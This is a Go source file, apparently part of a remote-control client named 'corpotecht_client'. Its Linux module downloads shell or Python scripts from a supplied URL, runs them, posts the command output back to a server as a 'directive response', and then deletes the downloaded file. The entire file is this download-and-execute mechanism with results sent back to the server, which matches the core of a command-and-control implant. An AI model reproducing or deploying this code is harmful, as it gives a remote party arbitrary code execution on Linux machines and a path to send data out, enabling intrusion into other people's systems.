//go:build linux
// +build linux

package linux

import (
	"corpotecht_client/config"
	"corpotecht_client/crossplatform"
	"corpotecht_client/utils"
	"io/ioutil"
	"net/url"
	"os"
	"os/exec"
)

func ExecShellScriptFromInternet(link string) {
	tempFile, err := ioutil.TempFile("", config.LinuxShellScriptName)
	utils.HandleError(err)
	defer tempFile.Close()

	utils.DownloadFile(link, tempFile)

	executeInShell(tempFile.Name(), config.LinuxTerminalLocation)
}

func ExecPythonScriptFromInternet(link string) {
	tempFile, err := ioutil.TempFile("", config.LinuxPythonScriptName)
	utils.HandleError(err)
	defer tempFile.Close()

	utils.DownloadFile(link, tempFile)

	executeInShell(tempFile.Name(), config.LinuxTerminalLocation)
}

func executeInShell(filename string, shell string) {

	out, _ := exec.Command(shell, filename).CombinedOutput()
	// Do not panic on error, instead send the error to the server
	// CombinedOutput returns its combined standard output and standard error.
	output := string(out[:])
	utils.DebugLog(output)
	payload := url.Values{
		"command_output": {output},
	}

	crossplatform.SendDirectiveResponse(payload)

	defer os.Remove(filename)
}
